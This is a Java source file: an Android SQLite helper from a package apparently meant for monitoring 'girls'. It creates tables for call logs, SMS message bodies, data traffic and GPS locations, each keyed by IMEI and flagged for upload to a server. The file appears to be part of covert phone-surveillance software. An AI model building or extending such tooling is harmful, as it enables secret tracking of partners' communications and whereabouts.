package com.dk.monitoryourgilrs;


import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;

public class DbHelper extends SQLiteOpenHelper
{
    private static DbHelper sInstance;
    private static final String DATABASE_NAME = "GirlsDB00";
    /**
     * Constructor should be private to prevent direct instantiation.
     * make call to static method "getInstance()" instead.
     */
    private DbHelper(Context context, String name, CursorFactory factory)
    {
        super(context, name, factory, 3);
        // TODO Auto-generated constructor stub
    }

    public static synchronized DbHelper getInstance(Context context) {

        // Use the application context, which will ensure that you
        // don't accidentally leak an Activity's context.
        // See this article for more information: http://bit.ly/6LRzfx
        if (sInstance == null) {
            sInstance = new DbHelper(context.getApplicationContext(),DATABASE_NAME,null);
        }
        return sInstance;
    }


    @Override
    public void onCreate(SQLiteDatabase db)
    {
        db.execSQL("create table calllog(_id long,imei text,name text,number text,date text,duration long,type text,updateServer Integer)");
        db.execSQL("create table smslog(" +
                "_id long," +
                "imei long," +
                "name text,"+
                "number text," +
                "date text," +
                "type Integer," +
                "body text," +
                "updateServer Integer" +
                ")"
        );
        db.execSQL("create table trafficDetail(_id long, imei long,date text, receive long,transfer long,updateServer Integer)");
        db.execSQL("create table location(_id long, imei long,date text, latitude double,longitude double,updateServer Integer)");
    }
    public void onUpgrade(SQLiteDatabase arg0, int arg1, int arg2)
    {

    }

}
